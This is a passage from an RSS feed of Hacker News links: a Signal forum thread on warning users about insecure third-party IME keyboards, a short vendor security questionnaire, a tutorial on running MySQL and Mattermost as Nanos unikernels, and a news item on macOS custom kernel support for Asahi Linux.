        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/dc7ia"><span itemprop="name">dc7ia</span></a>
            
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2019-11-22T21:21:55Z">
                November 22, 2019,  9:21pm
              </time>
              <meta itemprop="dateModified" content="2019-11-22T21:21:55Z">
          <span itemprop="position">#6</span>
          </span>
        </p></div>
        <p>Can Android apps get checksums of other apps? Then it could warn about some non legit apps at least.</p>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/johanw666"><span itemprop="name">johanw666</span></a>
            (Johanw666)
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2019-11-22T23:38:58Z">
                November 22, 2019, 11:38pm
              </time>
              <meta itemprop="dateModified" content="2019-11-22T23:38:58Z">
          <span itemprop="position">#8</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          
<p>Ony if you have root. But they can get a list of installed packages.</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/mac9416"><span itemprop="name">mac9416</span></a>
            (Michael Crenshaw)
          </span></p>


          <p><span>
              <meta itemprop="datePublished" content="2019-11-23T13:06:24Z">
              <time itemprop="dateModified" datetime="2019-11-23T13:11:23Z">
                November 23, 2019,  1:11pm
              </time>
          <span itemprop="position">#9</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <blockquote>
<p>Wait so just to be clear, the “signal vulnerability” is that Android’s Chinese keyboard sucks and people use a third party app?</p>
</blockquote>
<blockquote>
<p>While I understand the concern, I don’t see Signal being responsible for solving this threat vector.</p>
</blockquote>
<p>“Responsibility” is a bit illusory. I think it’s more useful to consider how easy it would be to add a feature that could really help people. If the impact outweighs the difficulty (and I think it probably does), then whether Signal is obligated to make the change seems like a red herring.</p>
<p>One philosopher could argue that the developers are responsible for nothing, since the app is free. Another could argue that they’re responsible for every possible “butterfly effect” of their decisions. That debate is a bit academic and I don’t think especially helpful for making decisions about feature requests.</p>
<blockquote>
<p>When Signal would do that, the same people would go nuts, saying that this is a violation and Signal should not track that. This time I would agree.</p>
</blockquote>
<p>Loss of users’ trust if the app gives the impression of “spying” on their language is a fair concern. But I think it could be implemented in a way that “tracks” nothing and offers a warning that allays any user concerns. For example, there could be a heuristic of “50% or more Chinese characters”. The first time an outgoing message triggers that heuristic, Signal could display a one-time warning. For example" It looks like you’re writing in Chinese. If you are using a third-party Chinese keyboard, it may not be secure. Consider using the phone’s built-in keyboard."</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/mac9416"><span itemprop="name">mac9416</span></a>
            (Michael Crenshaw)
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2019-11-23T13:09:07Z">
                November 23, 2019,  1:09pm
              </time>
              <meta itemprop="dateModified" content="2019-11-23T13:09:07Z">
          <span itemprop="position">#10</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <blockquote>
<p>I too, have to agree that Signal should not police how you are using your device (nor should any other software, unless it is a specific tool designed for that purpose).</p>
</blockquote>
<p>Absolutely, and I wouldn’t recommend any form of policing. But a well-timed and well-placed warning of this <em>very</em> common threat wouldn’t be (and I don’t think would even be perceived as) policing. The warning could be phrased in a way that emphasizes the risks of using third-party IME <em>alongside</em> Signal and makes no general claims about whether the user should take advantage of those apps in other contexts.</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/mac9416"><span itemprop="name">mac9416</span></a>
            (Michael Crenshaw)
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2019-11-23T13:14:00Z">
                November 23, 2019,  1:14pm
              </time>
              <meta itemprop="dateModified" content="2019-11-23T13:14:00Z">
          <span itemprop="position">#11</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          
<p>That sounds like it has the potential to be a really slick heuristic. “You seem to be using X app… here’s why that might be a problem.” On the other hand, there might be a higher risk of false positives than with a “50%+ Chinese characters” heuristic. I’ll have to defer to folks who know more about app development.</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/johanw666"><span itemprop="name">johanw666</span></a>
            (Johanw666)
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2019-11-23T13:18:26Z">
                November 23, 2019,  1:18pm
              </time>
              <meta itemprop="dateModified" content="2019-11-23T13:18:26Z">
          <span itemprop="position">#12</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <p>Well, it has sometimes uses if you want to launch another app from an app with an intent. For example, if your app includes a user manual in pdf form and wants to show it in the standard pdf reader on the device. If there is no pdf reader you want to give a warning explaining the issue.</p>
<p>Code to heck it is really easy, see <a href="https://stackoverflow.com/questions/2695746/how-to-get-a-list-of-installed-android-applications-and-pick-one-to-run" rel="nofollow noopener">this article on Stackoverflow</a> how to do that.</p>
<p>The asked for checksum would require to locate the installed apk and read it, which requires root. And split apk’s would make it even more difficult.</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/wrapper"><span itemprop="name">wrapper</span></a>
            (Bobby)
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2021-01-12T14:40:33Z">
                January 12, 2021,  2:40pm
              </time>
              <meta itemprop="dateModified" content="2021-01-12T14:40:33Z">
          <span itemprop="position">#13</span>
          </span>
        </p></div>
        <p>Just here to bump this issue as it is clearly still relevant and is quite concerning that Signal isn’t offering a response?</p>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/newuser"><span itemprop="name">newuser</span></a>
            
          </span></p>


          <p><span>
              <meta itemprop="datePublished" content="2021-01-12T15:00:30Z">
              <time itemprop="dateModified" datetime="2021-01-12T15:02:46Z">
                January 12, 2021,  3:02pm
              </time>
          <span itemprop="position">#15</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <p>There was a lot of discussion on warning users that notifications could also be logged. It seems like there are a lot of problematic things in Android that people need to be aware of and protect themselves accordingly. I’m not sure how much of a role Signal should play in that or even if it needs to.</p>
<p>Other things I can immediately think of:<br>
export a photo?it might get stored in some cloud service<br>
listening to a voice note? the digital assistant might also be listening to it</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/wrapper"><span itemprop="name">wrapper</span></a>
            (Bobby)
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2021-01-12T15:18:56Z">
                January 12, 2021,  3:18pm
              </time>
              <meta itemprop="dateModified" content="2021-01-12T15:18:56Z">
          <span itemprop="position">#16</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <p>I understand the argument. The issue is that with the huge influx of new users, Signal do have a responsibility to flag such potential security flaws.</p>
<p>It seems like a pretty obvious thing for them to offer an untracked keyboard option in the app anyway, like some banking apps do. Or just a warning to ensure your Android device is secure.</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/jwithing"><span itemprop="name">jwithing</span></a>
            (Jeff)
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2021-01-12T15:24:29Z">
                January 12, 2021,  3:24pm
              </time>
              <meta itemprop="dateModified" content="2021-01-12T15:24:29Z">
          <span itemprop="position">#17</span>
          </span>
        </p></div>
        <p>I agree that Signal should warn users who are using insecure IME. Signal has a responsibility to clearly communicate attack vectors to users, especially as an increasing number of less sophisticated users join the platform.</p>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/newuser"><span itemprop="name">newuser</span></a>
            
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2021-01-12T15:33:39Z">
                January 12, 2021,  3:33pm
              </time>
              <meta itemprop="dateModified" content="2021-01-12T15:33:39Z">
          <span itemprop="position">#18</span>
          </span>
        </p></div>
        <p>Do you mean the incognito keyboard setting or do you want them to include a keyboard of their own? If the latter, it probably could be a well vetted separate app that someone else provides.</p>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

            
      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/wrapper"><span itemprop="name">wrapper</span></a>
           …</span></p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://community.signalusers.org/t/signal-should-warn-users-who-are-likely-using-insecure-ime-apps/10272">https://community.signalusers.org/t/signal-should-warn-users-who-are-likely-using-insecure-ime-apps/10272</a></em></p>]]>
            </description>
            <link>https://community.signalusers.org/t/signal-should-warn-users-who-are-likely-using-insecure-ime-apps/10272</link>
            <guid isPermaLink="false">hacker-news-small-sites-25793438</guid>
            <pubDate>Fri, 15 Jan 2021 17:29:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Our Dumb Security Questionnaire]]>
            </title>
            <description>
<![CDATA[
Score 140 | Comments 71 (<a href="https://news.ycombinator.com/item?id=25793230">thread link</a>) | @zdw
<br/>
January 15, 2021 | https://hangar.tech/posts/our-dsq/ | <a href="https://web.archive.org/web/*/https://hangar.tech/posts/our-dsq/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>Last year, one of our startups needed to buy a SaaS product (case management and workflow software). There were several promising vendors, all with products that looked impressive. Technically, all had the features and APIs we were looking for. However, we had security concerns. We planned on storing extremely sensitive data in this tool, and wanted to understand their security posture before we selected a vendor.</p><p>This a common problem; you’ve probably ran into it yourself. With SaaS software, how do you verify its security? As an industry, our answers are … poor. We have various certifications (PCI, HIPAA/HITECH, FedRAMP, etc), but all too often these are box-ticking exercises with no real security value – just ask <a href="https://www.schneier.com/blog/archives/2020/12/russias-solarwinds-attack.html">SolarWinds</a>.</p><p>So, security teams often end up sending potential vendors a bunch of questions – what Latacora calls a <a href="https://latacora.micro.blog/its-weird-to/">Dumb Security Questionnaire</a>. As the title implies, the practice … isn’t great. Most DSQs are full of questions with no security value (which explains why most security teams don’t actually read the responses!). But unfortunately, they’re also kinda the best we can do. Huge companies might be able to afford real human-powered security audits and convince vendors to allow them, but small startups like ours don’t have a better option than relying on DSQs.</p><p>As Latacora points out, it turns out there isn’t really a ton that you need to ask. As a startup, we’re not looking for our vendor to be Fort Knox; we just need to know that storing data with them is at least as safe as storing it internally. There are a limited number of likely ways that our vendor might get owned; we just need to ask about those few basic things. Latacora ends their post with this:</p><blockquote><p>Someone — and I am not volunteering — should write the DSQ that just nails these basic
things. 10 questions, no diagrams.</p></blockquote><p>Well, we tried; here it is.</p><h3 id="who-this-is-for">Who this is for</h3><p>This questionnaire is designed for smaller, probably early-stage companies who need to evaluate a vendor. It makes some assumptions:</p><ul><li>You have a security person (or team) who can evaluate the answers and is part of the decision-making process. If nobody’s going to read the answers, don’t waste your vendor’s time.</li><li><em>Your</em> answers to these questions are already pretty ok. If not, stop wasting time evaluating vendors. Just buy the thing and use the time you save to get your own house in order.</li><li>This is for some SaaS product that’ll have particularly high security impact - i.e. a breach of the vendor would be a major, potentially company-ending event. If you’re just trying to decide which ticket tracking system to use, again: just buy one and move on.</li><li>You have no particular compliance requirements – so you’re looking purely evaluate security posture, not compliance.</li></ul><h3 id="our-dumb-security-questionnaire">Our Dumb Security Questionnaire</h3><h4 id="1-please-answer-these-questions">(1) Please answer these questions:</h4><ol><li>If you use a cloud provider (GCP/AWS/Azure/etc):<ul><li>describe how credentials are provisioned, managed, and stored.</li><li>If an attacker gained access to an individual developer’s cloud
credentials, what actions could that attacker perform, and how would you
detect and respond to the breach?</li></ul></li><li>If you don’t use a cloud provider: why not?</li><li>Describe how staff authenticate to company services (e.g. servers, email, SaaS
products), particularly highlighting your use of password managers, 2FA, and
SSO.</li><li>What development practices do you use to protect against the OWASP Top 10?</li><li>Describe the steps a developer or operations person takes to push new code to production.</li><li>Have you had any security breaches in the last two years?<ul><li>If yes: please explain the breach, and provide copies of any postmortem/root cause analysis/after-action reports.</li></ul></li></ol><h4 id="2-and-please-provide-as-many-of-the-following-as-possible">(2) And, please provide as many of the following as possible:</h4><ol><li>A recent (last 12 months) penetration test report, with information on what
follow-ups/remediation steps were taken. Reports by an external firm are
preferable; internal tests are OK. A redacted summary is fine as long as it
includes basic vulnerability descriptions and severity levels.</li><li>Documentation on your organization’s Secure Development Lifecycle, or similar, if you
have them. If not, please summarize the steps you take to help engineers write secure
code.</li><li>A copy of any security training material provided to staff, particularly
software developers. A summary/description of classes and content is fine.</li><li>A link to your Vulnerability Disclosure Policy and/or bug bounty program. If you don’t
have either: please explain.</li></ol><p>(10 questions, no diagrams :)</p><h4 id="license">License</h4><p>This questionnaire is <a href="https://creativecommons.org/publicdomain/zero/1.0/">released to the public domain</a>. We’d appreciate it if you credit us if you release a
derivative of this, but do what you like.</p></article></div>]]>
            </description>
            <link>https://hangar.tech/posts/our-dsq/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25793230</guid>
            <pubDate>Fri, 15 Jan 2021 17:13:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Running MatterMost as a Unikernel]]>
            </title>
            <description>
<![CDATA[
Score 23 | Comments 7 (<a href="https://news.ycombinator.com/item?id=25792618">thread link</a>) | @eyberg
<br/>
January 15, 2021 | https://nanovms.com/dev/tutorials/running-mattermost-as-unikernel | <a href="https://web.archive.org/web/*/https://nanovms.com/dev/tutorials/running-mattermost-as-unikernel">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

                <p>Mattermost is an open source, private cloud slack
alternative written in Go and React. It has many integrations and can
can connect to mysql or postgres for persistence. While there are many
"hello world" tutorials out there for running the Nanos unikernel we
thought this would be a nice little example to showcase two things:</p>

<p>1) How to run a multi-node setup. Most web applications are more than
just one actual application - the canonical example would be a webapp
server and its corresponding database.</p>
<p>2) How to interact with taps and bridges for a faster networking
experience or if you wanted to build your own private cloud. (Creating taps,
today, will only work on Linux as the tuntaposx package does not work
anymore but we're looking at alternatives.)</p>

<p>Ready? Let's get started.</p>

                <h3>Running mysql as a Nanos unikernel</h3>

                <p>We start by running the mysql server as a unikernel.
We've created a convenient package to use and the only thing you need to
do is set your base volume size. You could create an external volume but
we'll leave that to a different article.</p>

<pre><code>{
  "BaseVolumeSz": "400m"
}
</code></pre>

<p>Now let's run mysql by creating a tap device and assigning it a
static ip:</p>

                <pre><code>➜  mysql ops load mysql_5.7.29 -c config.json -p 3306 -b -t tap0 --ip-address 192.168.42.19
[mysqld --user=root --explicit_defaults_for_timestamp]
booting /home/eyberg/.ops/images/mysqld.img ...
assigned: 192.168.42.19
2021-01-11T17:45:54.942930Z 0 [Warning] The syntax '--log_warnings/-W' is deprecated and will be removed in a future release. Please use '--log_error_verbosity' instead.
2021-01-11T17:45:54.945335Z 0 [Warning] Insecure configuration for --secure-file-priv: Location is accessible to all OS users. Consider choosing a different directory.
2021-01-11T17:45:54.945564Z 0 [Note] mysqld (mysqld 5.7.29-0ubuntu0.18.04.1-log) starting as process 2 ...
2021-01-11T17:45:54.957853Z 0 [Note] InnoDB: PUNCH HOLE support available
2021-01-11T17:45:54.959551Z 0 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins
2021-01-11T17:45:54.961557Z 0 [Note] InnoDB: Uses event mutexes
2021-01-11T17:45:54.962979Z 0 [Note] InnoDB: GCC builtin __atomic_thread_fence() is used for memory barrier
2021-01-11T17:45:54.965371Z 0 [Note] InnoDB: Compressed tables use zlib 1.2.11
2021-01-11T17:45:54.967107Z 0 [Note] InnoDB: Using Linux native AIO
2021-01-11T17:45:54.968929Z 0 [Note] InnoDB: Number of pools: 1
2021-01-11T17:45:54.970498Z 0 [Note] InnoDB: Using CPU crc32 instructions
2021-01-11T17:45:54.974749Z 0 [Note] InnoDB: Initializing buffer pool, total size = 128M, instances = 1, chunk size = 128M
2021-01-11T17:45:54.985275Z 0 [Note] InnoDB: Completed initialization of buffer pool
2021-01-11T17:45:54.989751Z 0 [Note] InnoDB: If the mysqld execution user is authorized, page cleaner thread priority can be changed. See the man page of setpriority().
2021-01-11T17:45:55.008773Z 0 [Note] InnoDB: Highest supported file format is Barracuda.
2021-01-11T17:45:55.024639Z 0 [Note] InnoDB: Creating shared tablespace for temporary tables
2021-01-11T17:45:55.026961Z 0 [Note] InnoDB: Setting file './ibtmp1' size to 12 MB. Physically writing the file full; Please wait ...
2021-01-11T17:45:55.062911Z 0 [Note] InnoDB: File './ibtmp1' size is now 12 MB.
2021-01-11T17:45:55.065453Z 0 [Note] InnoDB: 96 redo rollback segment(s) found. 96 redo rollback segment(s) are active.
2021-01-11T17:45:55.068301Z 0 [Note] InnoDB: 32 non-redo rollback segment(s) are active.
2021-01-11T17:45:55.070845Z 0 [Note] InnoDB: 5.7.29 started; log sequence number 2631215
2021-01-11T17:45:55.073134Z 0 [Note] InnoDB: Loading buffer pool(s) from /var/lib/mysql/ib_buffer_pool
2021-01-11T17:45:55.075770Z 0 [Note] Plugin 'FEDERATED' is disabled.
2021-01-11T17:45:55.086078Z 0 [Note] InnoDB: Buffer pool(s) load completed at 210111 17:45:55
2021-01-11T17:45:55.097471Z 0 [Note] Found ca.pem, server-cert.pem and server-key.pem in data directory. Trying to enable SSL support using them.
2021-01-11T17:45:55.100836Z 0 [Note] Skipping generation of SSL certificates as certificate files are present in data directory.
2021-01-11T17:45:55.105239Z 0 [Warning] CA certificate ca.pem is self signed.
2021-01-11T17:45:55.107312Z 0 [Note] Skipping generation of RSA key pair as key files are present in data directory.
2021-01-11T17:45:55.110568Z 0 [Note] Server hostname (bind-address): '0.0.0.0'; port: 3306
2021-01-11T17:45:55.112817Z 0 [Note]   - '0.0.0.0' resolves to '0.0.0.0';
2021-01-11T17:45:55.114596Z 0 [Note] Server socket created on IP: '0.0.0.0'.
2021-01-11T17:45:55.116577Z 0 [Warning] Insecure configuration for --pid-file: Location '/var/lib/mysql' in the path is accessible to all OS users. Consider choosing a different directory.
2021-01-11T17:45:55.136775Z 0 [Note] Event Scheduler: Loaded 0 events
2021-01-11T17:45:55.138651Z 0 [Note] mysqld: ready for connections.
Version: '5.7.29-0ubuntu0.18.04.1-log'  socket: '/var/run/mysqld/mysqld.sock'  port: 3306  (Ubuntu)
</code></pre>

<p>We should be able to connect to the server and create a mattermost
database:</p>

                <pre><code>mysql -u root -h 192.168.42.19
create datbase mattermost;</code></pre>

<p>Ops load by default will re-build the image each time so if you want
to skip that you can pass the '-s' flag or use 'ops instance create' instead.</p>

                <h3>Running MatterMost as a Unikernel</h3>

<p>For mattermost we'll want to edit the mattermost config.json (not to
be confused with the config.json we use for ops). Create a 'config'
directory to store it in. Copy the config.json in. If you want, you can
untar the tarball found in ~/.ops/packages/mattermost_5.12.0.tar.gz and grab a
copy there. Then you'll want to edit the mysql "DataSource" line in
config.json to modify the ip address and l/p:</p>

<pre><code>"DataSource": "root:root@tcp(192.168.42.19:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
</code></pre>

<p>Obviously this is just for demo purposes but as a side note - if you
do accidently deploy this to a public ip with default credentials the
bots that scour the internet looking for these things will be able to
connect and write all the SQL their little bot hearts desire, but their
db encryption operations fail, the cryptojacking
fails, and all the C&amp;C stuff fails. It just shows you how interesting
this style of architecture truly is.</p>

<p>Now let's load up mattermost and give it it's own tap and assign it a static ip address:</p>

                <pre><code>➜ ops load mattermost_5.12.0 -c config.json -p 8065 -b -t tap1 --ip-address 192.168.42.20
warning: overwriting existing file /config/config.json hostpath old: /home/eyberg/.ops/.staging/mattermost_5.12.0/sysroot/config/config.json new: config/config.json
[mattermost -c config/config.json --disableconfigwatch]
booting /home/eyberg/.ops/images/mattermost.img ...
assigned: 192.168.42.20
{"level":"info","ts":1610387180.047103,"caller":"utils/i18n.go:83","msg":"Loaded system translations for 'en' from '/i18n/en.json'"}
{"level":"info","ts":1610387180.0498981,"caller":"app/server_app_adapters.go:58","msg":"Server is initializing..."}
{"level":"error","ts":1610387180.0560362,"caller":"app/server_app_adapters.go:69","msg":"Failed to parse server templates function not implemented"}
{"level":"info","ts":1610387180.0593297,"caller":"sqlstore/supplier.go:224","msg":"Pinging SQL master database"}
{"level":"info","ts":1610387180.231293,"caller":"sqlstore/upgrade.go:104","msg":"The database schema has been set to version 5.12.0"}
{"level":"error","ts":1610387204.4853191,"caller":"app/server_app_adapters.go:125","msg":"SiteURL must be set. Some features will operate incorrectly if the SiteURL is not set. See documentation for details: http://about.mattermost.com/default-site-url"}
{"level":"info","ts":1610387204.5032592,"caller":"filesstore/localstore.go:33","msg":"Able to write files to local storage."}
{"level":"info","ts":1610387204.7344124,"caller":"app/license.go:41","msg":"License key from https://mattermost.com required to unlock enterprise features."}
{"level":"info","ts":1610387204.982482,"caller":"app/migrations.go:26","msg":"Migrating roles to database."}
{"level":"info","ts":1610387208.7359424,"caller":"sqlstore/post_store.go:1277","msg":"Post.Message supports at most 16383 characters (65535 bytes)"}
{"level":"info","ts":1610387209.2314367,"caller":"app/migrations.go:102","msg":"Migrating emojis config to database."}
{"level":"info","ts":1610387246.2326972,"caller":"mlog/log.go:164","msg":"Starting up plugins"}
{"level":"info","ts":1610387246.241575,"caller":"app/server.go:213","msg":"Current version is 5.12.0 (5.12.0/Sat Jun 15 09:02:50 UTC 2019/bfd66aa445a2df8c6ed6b a9f2567021ecf6c9f3b/403add5df2a572f676fd9da85ad80623cb00b88a)"}
{"level":"info","ts":1610387246.2597792,"caller":"app/server.go:214","msg":"Enterprise Enabled: true"}
{"level":"info","ts":1610387246.267642,"caller":"app/server.go:216","msg":"Current working directory is /"}
{"level":"info","ts":1610387246.276085,"caller":"app/server.go:217","msg":"Loaded config","source":"file:///config/config.json"}
{"level":"info","ts":1610387246.9817462,"caller":"jobs/workers.go:68","msg":"Starting workers"}
{"level":"info","ts":1610387246.989871,"caller":"app/server.go:413","msg":"Starting Server..."}
{"level":"info","ts":1610387246.9986944,"caller":"app/server.go:479","msg":"Server is listening on [::]:8065"}
{"level":"info","ts":1610387247.0144029,"caller":"jobs/schedulers.go:72","msg":"Starting schedulers."}
{"level":"info","ts":1610387247.0446193,"caller":"app/web_hub.go:75","msg":"Starting 2 websocket hubs"}
</code></pre>

<p>If everything works you'll see the login/setup page for mattermost!</p>

            <center><img src="https://nanovms.com/static/dist/img/tutorials/mattermost.png"></center>

      </div></div>]]>
            </description>
            <link>https://nanovms.com/dev/tutorials/running-mattermost-as-unikernel</link>
            <guid isPermaLink="false">hacker-news-small-sites-25792618</guid>
            <pubDate>Fri, 15 Jan 2021 16:29:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[macOS beta adds custom kernel support, closer to installing other OSS on M1 Macs]]>
            </title>
            <description>
<![CDATA[
Score 51 | Comments 12 (<a href="https://news.ycombinator.com/item?id=25792565">thread link</a>) | @CharlesW
<br/>
January 15, 2021 | https://the8-bit.com/macos-big-sur-11-2-beta-2-brings-custom-kernel-support-putting-us-one-step-closer-to-installing-other-operating-systems-on-m1-macs/ | <a href="https://web.archive.org/web/*/https://the8-bit.com/macos-big-sur-11-2-beta-2-brings-custom-kernel-support-putting-us-one-step-closer-to-installing-other-operating-systems-on-m1-macs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>Two weeks ago, security researcher and developer Hector Martin (@marcan42 on Twitter), <a href="https://the8-bit.com/asahi-is-a-novel-project-with-the-goal-of-porting-linux-to-m1-macs/">kicked off an ambitious project</a> with the goal of natively bringing Linux to <a href="https://the8-bit.com/which-m1-apple-silicon-macbook-you-should-buy/">Apple Silicon Macs</a>. The operating system-to-be is called Asahi Linux and apparently today, the project experienced its first breakthrough.</p>
<p>Apple released the second beta of macOS Big Sur 11.2 yesterday. It’s an incremental upgrade that does not necessarily bring grandiose novelty to the table. Instead, as it goes, beta versions often do introduce a lot of under-the-hood features. And one of those features was custom kernel support, as noted by Hector himself.</p>
<p>A kernel is one of the most important aspects of an operating system that has absolute control over everything happening inside a computer. It is a cog that is responsible for interactions between hardware and software components.</p>
<p>That said, support for custom kernels might not excite you, per se. But if you’re dedicated to reverse-engineer Apple’s software for Macs, it’s a pretty big deal. Custom kernels are essentially modified stock kernels. You can add your own features to the modified kernel that the manufacturer does not ship in its own, which means you can make a computer do things it wasn’t originally intended to do.</p>
<p>According to Hector, thanks to kernel support in the latest macOS beta, “the OS now finally includes the firmware and bootloaders and tools necessary to replace Big Sur with not-Big-Sur. That was previously not possible.” He also shared a clip of his MacBook Air displaying the Asahi Linux bootloader:</p>
<figure><div>
<blockquote data-width="550" data-dnt="true"><div lang="en" dir="ltr"><p>It's happening.</p><p>macOS Big Sur 11.2 beta 2 is out with full custom kernel support.</p><p>Expect a fun early bring-up stream tomorrow. Time to get a few hours of sleep. <a href="https://t.co/Ujq159DqWQ" target="_blank">pic.twitter.com/Ujq159DqWQ</a></p></div>— Hector Martin (@marcan42) <a href="https://twitter.com/marcan42/status/1349478954982232064?ref_src=twsrc%5Etfw" target="_blank" rel="noopener">January 13, 2021</a></blockquote>
</div></figure>
<p>A bootloader, for instance, is an integral part of powering up your machine. It handles the boot order of operating systems on a machine. Each machine has a bootloader that’s specific to it and gaining control over it is an important step towards installing an entirely different operating system.</p>
<p>Despite the new improvements, it might take some time for a native Linux installation on an M1 Mac to realize and be ready for public distribution. Aside from the custom kernel support, the developers on the Asahi Linux project still need to work on developing drivers for the operating system.</p><div><p>See also</p><div id="block-wrap-95278" data-id="95278" data-base="0"><div><div><div><article><div><p><a href="https://the8-bit.com/apple-store-goes-down-ahead-of-todays-mac-event/" title="Apple Store Down"><img width="100" height="100" src="https://the8-bit.com/wp-content/uploads/2020/11/Apple-Store-Down-100x100.jpg" alt="Apple Store Down" srcset="https://the8-bit.com/wp-content/uploads/2020/11/Apple-Store-Down-100x100.jpg 100w, https://the8-bit.com/wp-content/uploads/2020/11/Apple-Store-Down-293x293.jpg 293w, https://the8-bit.com/wp-content/uploads/2020/11/Apple-Store-Down-432x432.jpg 432w, https://the8-bit.com/wp-content/uploads/2020/11/Apple-Store-Down-529x529.jpg 529w, https://the8-bit.com/wp-content/uploads/2020/11/Apple-Store-Down-724x724.jpg 724w" sizes="(max-width: 100px) 100vw, 100px"></a></p></div></article></div></div></div></div></div>
<p>Back in November 2020, Apple’s VP of Software Engineering Craig Federighi said <a aria-label="in an interview with Ars Technica (opens in a new tab)" href="https://arstechnica.com/gadgets/2020/11/we-are-giddy-interviewing-apple-about-its-mac-silicon-revolution/" target="_blank" rel="noreferrer noopener">in an interview with Ars Technica</a> that when it comes to Windows running natively on an M1 Mac, “that’s really up to Microsoft. We have the core technologies for them to do that, to run their ARM version of Windows, which in turn of course supports x86 user-mode applications. But that’s a decision Microsoft has to make, to bring to license that technology for users to run on these Macs. But the Macs are certainly very capable of it.”</p>
<p>The newly added support for custom kernels on Big Sur’s 11.2 Beta 2 may also set a precedent for Microsoft to make the ARM version of Windows available to M1 Mac users as an alternate operating system.</p>
<p>As we’ve noted before, Asahi Linux is an independent project that relies on people’s contributions to continue. You can either offer to volunteer your expertise to the project or contribute an amount to the <a aria-label="project's Patreon (opens in a new tab)" href="https://asahilinux.org/support/" target="_blank" rel="noreferrer noopener">project’s Patreon</a> to expedite the development.</p>
<p>Let us know your thoughts about this story in the comments section below.</p>
</div></div>]]>
            </description>
            <link>https://the8-bit.com/macos-big-sur-11-2-beta-2-brings-custom-kernel-support-putting-us-one-step-closer-to-installing-other-operating-systems-on-m1-macs/</link>
